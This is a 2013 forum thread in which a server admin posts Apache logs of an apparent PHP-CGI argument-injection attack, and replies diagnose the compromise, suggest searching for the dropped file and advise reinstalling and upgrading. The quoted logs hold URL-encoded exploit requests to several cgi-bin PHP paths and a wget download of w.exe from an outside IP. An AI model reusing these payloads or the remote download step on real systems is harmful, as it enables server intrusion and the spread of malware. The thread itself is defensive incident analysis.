---
title: "Remote Users Uploading Files?"
date: 2013-11-15
forum: Security
---

### Post by skymedialab on 2013-11-15
I'm running an Apache v/2.2.17, php 5.3.5 web server Ubuntu Natty Narwhal with rackspace, I was revewing the apache error.log and it looks like someone is uploading files to the server?  is there a way to stop this hack if it is one?

from apache error.log


[Thu Nov 14 04:09:38 2013] [error] [client 78.46.89.134] script not found or unable to stat: /usr/lib/cgi-bin/php
[Thu Nov 14 04:09:39 2013] [error] [client 78.46.89.134] rm: cannot remove `wsdl-evidz-web-e8cd24a4863cdc49509ffa85f6051098': Operation not permitted
[Thu Nov 14 04:09:39 2013] [error] [client 78.46.89.134] --2013-11-14 04:09:39--  [http://72.55.137.105/w.exe](http://72.55.137.105/w.exe)
[Thu Nov 14 04:09:39 2013] [error] [client 78.46.89.134] Connecting to 72.55.137.105:80...
[Thu Nov 14 04:09:39 2013] [error] [client 78.46.89.134] connected.
[Thu Nov 14 04:09:39 2013] [error] [client 78.46.89.134] HTTP request sent, awaiting response...
[Thu Nov 14 04:09:39 2013] [error] [client 78.46.89.134] 200 OK
[Thu Nov 14 04:09:39 2013] [error] [client 78.46.89.134] Length:
[Thu Nov 14 04:09:39 2013] [error] [client 78.46.89.134] 15757
[Thu Nov 14 04:09:39 2013] [error] [client 78.46.89.134]  (15K)
[Thu Nov 14 04:09:39 2013] [error] [client 78.46.89.134]  [application/octet-stream]
[Thu Nov 14 04:09:39 2013] [error] [client 78.46.89.134] Saving to: `w.exe'
[Thu Nov 14 04:09:39 2013] [error] [client 78.46.89.134]
[Thu Nov 14 04:09:39 2013] [error] [client 78.46.89.134]      0K
[Thu Nov 14 04:09:39 2013] [error] [client 78.46.89.134]
[Thu Nov 14 04:09:39 2013] [error] [client 78.46.89.134] .
[Thu Nov 14 04:09:39 2013] [error] [client 78.46.89.134] .

matches up with the access log here?


78.46.89.134 - - [14/Nov/2013:04:09:38 +0000] "POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68$
78.46.89.134 - - [14/Nov/2013:04:09:38 +0000] "POST /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%6$
78.46.89.134 - - [14/Nov/2013:04:19:39 +0000] "POST /cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%7$
78.46.89.134 - - [14/Nov/2013:04:19:39 +0000] "POST /cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%7$
78.46.89.134 - - [14/Nov/2013:04:19:39 +0000] "POST /cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%6$
2

---

### Post by jfolsom2 on 2013-11-15
The error.log implies that you have likely been compromised. Someone/thing is downloading the w.exe file to your machine internally, i.e. a bot or individual has compromised your machine and attempting to pull down more tools, or a file to be served to others.

If I saw this on any of my servers, I'd disconnect it from the internet and copy off vital data. Then I'd wipe the disk and reinstall.

---

### Post by houstonbofh on 2013-11-15
First, find out if they actually managed to upload w.exe.
```
find / -name w.exe 2>/dev/null
```
This will take a while...
If you find it, you need to see why your web server was able to allow uploads.  You also need to delete it immediately.  It is a windows Trojan, and you are infecting lots of Windows users.  A little while of this, and Google will make you as dangerous, and Firefox will block you.

---

### Post by mikewhatever on 2013-11-16
...another thing, the support for Natty has ended more then a year ago. It's a good idea to switch to a supported release, for example 12.04, and install security updates.

---

